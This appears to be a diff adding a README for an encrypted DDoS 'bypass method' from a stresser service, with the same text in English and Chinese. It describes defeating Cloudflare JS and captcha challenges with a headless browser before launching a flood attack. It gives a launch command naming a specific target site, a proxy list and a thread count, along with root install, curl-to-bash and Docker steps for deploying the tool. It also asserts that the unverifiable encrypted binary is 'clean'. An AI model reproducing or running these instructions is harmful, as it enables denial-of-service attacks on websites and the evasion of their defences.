@@ -1,0 +1,32 @@
+This bypass method will send the initial request through a Browser to bypass JS and when it reaches 16 bypasses it will start the attack. It only works on HTTPS:// websites.
+
+The method is clean and doesnt contain any virus but I encrypted it to prevent modification by non authors.
+
+It works primarily on Cloudflare JS and Captcha but can work on other protections, it might need modification on the flare library.
+
+This method was coded by @jeffspender for CryptoStresser.com
+
+
+这种旁路方法将通过浏览器发送初始请求以绕过JS，当它达到16次绕过时，它将启动攻击。 它仅适用于HTTPS：//网站。
+
+该方法是干净的，不包含任何病毒，但我加密它，以防止非作者修改。
+
+它主要适用于 Cloudflare JS 和 Captcha，但可以在其他保护上工作，它可能需要修改flare库。
+
+这个方法是由 @jeffspender 编码的。CryptoStresser.com
+
+
+
+Command: ./browser-linux https://exitus.me/ 300 proxies.txt
+
+Install software required and reboot server:
+
+sudo apt -y install curl dirmngr apt-transport-https lsb-release ca-certificates;curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -;sudo apt -y install nodejs;sudo apt -y install gcc g++ make;sudo apt -y install htop vnstat;sudo apt-get install -y unzip;sudo apt -y install screen;sudo apt -y install unrar;sudo apt -y install golang-go; go get github.com/erikdubbelboer/gspt; npm i await-timeout;npm i console-log-level;npm i events; npm i request;npm i chalk; npm i hpagent; npm i got; npm i crypto; npm i cheerio; npm i url; npm i axios; npm i https; npm i request-curl;npm i user-agents; npm i uuid; npm i tmp-promise; npm i puppeteer-extra;npm i puppeteer-extra-plugin-stealth;npm i sleep-promise; npm i puppeteer-extra-plugin-adblocker;sudo apt install apt-transport-https ca-certificates curl software-properties-common; curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -;sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu focal stable"; sudo apt update; sudo apt install docker-ce; sudo curl -L "https://github.com/docker/compose/releases/download/1.26.0/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose;sudo chmod +x /usr/local/bin/docker-compose; echo  "\n${gren}Installation Modules Required Done, Preparing the Next Stage..\n${white}"; sleep 6; npm install puppeteer; sudo apt install -y gconf-service libasound2 libatk1.0-0 libc6 libcairo2 libcups2 libdbus-1-3 libexpat1 libfontconfig1 libgcc1 libgconf-2-4 libgdk-pixbuf2.0-0 libglib2.0-0 libgtk-3-0 libnspr4 libpango-1.0-0 libpangocairo-1.0-0 libstdc++6 libx11-6 libx11-xcb1 libxcb1 libxcomposite1 libxcursor1 libxdamage1 libxext6 libxfixes3 libxi6 libxrandr2 libxrender1 libxss1 libxtst6 ca-certificates fonts-liberation libappindicator1 libnss3 lsb-release xdg-utils wget; sudo apt-get install -y libgbm-dev;echo -e "\n${red}Reboot Server Required..\n${white}"; sleep 6; reboot
+
+Start Chrome browser instance:
+
+cd /root/flare/8120; export PUPPETEER_PRODUCT=firefox; sudo npm install;node node_modules/puppeteer/install.js;export PUPPETEER_PRODUCT=firefox; docker-compose up -d; docker build -t cryptostresser:custom .;screen -S browser -dms LIBCRYPTOSTRESSER docker run -p 8120:8120 -e LOG_LEVEL=debug cryptostresser:custom
+
+Make sure browser is running with:
+
+screen -rd browser
